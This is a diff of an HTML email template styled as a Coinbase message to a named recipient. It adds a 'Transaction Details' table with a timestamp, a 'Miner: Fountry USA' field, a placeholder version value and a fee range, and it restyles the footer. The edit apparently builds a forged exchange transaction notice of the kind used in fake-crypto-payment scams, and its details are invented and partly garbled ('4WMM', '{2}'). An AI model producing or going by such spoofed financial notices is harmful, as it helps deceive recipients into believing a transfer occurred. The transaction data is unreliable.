@@ -1,4 +1,4 @@
- 
+1 
 <html>
 <head>
   <meta charset="UTF-8">
@@ -50,7 +50,32 @@
                   <td style="padding:10px;">DAVID ALAN GRENWALT</td>
                 </tr>
               </table>
-
+<hr>
+           
+ <!-- 4WMMTransaction Details -->
+ <table role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#333; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
+                <tr>
+                  <td style="padding:10px;"><strong>Time stamp :</strong></td>
+                  <td style="padding:10px;">2025-04-22 23:59:59 UTC</td>
+                </tr>
+                <tr>
+                  <td style="padding:10px;"><strong>Health:</strong></td>
+                  <td style="padding:10px; color: green;">100%</td>
+                </tr>
+                <tr>
+                  <td style="padding:10px;"><strong>Miner:</strong></td>
+                  <td style="padding:10px;">Fountry USA</td>
+                </tr>
+                <tr>
+                  <td style="padding:10px;"><strong>Version:</strong></td>
+                  <td style="padding:10px;">{2}</td>
+                </tr>
+                <tr>
+                  <td style="padding:10px;"><strong>Fee Span:</strong></td>
+                  <td style="padding:10px;">2 - 101 sat/vB </td>
+                </tr>
+              </table>
+              
               <!-- Buttons -->
               
  <a href="https://login.coinbase.com/signin" style="font-size:16px; font-weight:bold; background-color:#0052ff; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:5px; display:inline-block; margin:10px 5px;" class="button" target="_blank">Login to Coinbase</a>
@@ -61,13 +86,11 @@
 
           <!-- Footer -->
    <tr>
-            <td align="center" style="padding: 30px 20px; font-size:12px; color:#999999;">
-              © 2025 Coinbase, Inc. All rights reserved.<br/>
+           <td align="center" style="padding: 30px 20px; font-size:12px; color: green;">
+ © 2025 Coinbase, Inc. All rights reserved.<br/>
               ® PRIVACY POLICY
-            </td>
-          </tr>
-
- </table>
+</td>
+</table>
    </td>
    </tr>
   </table>
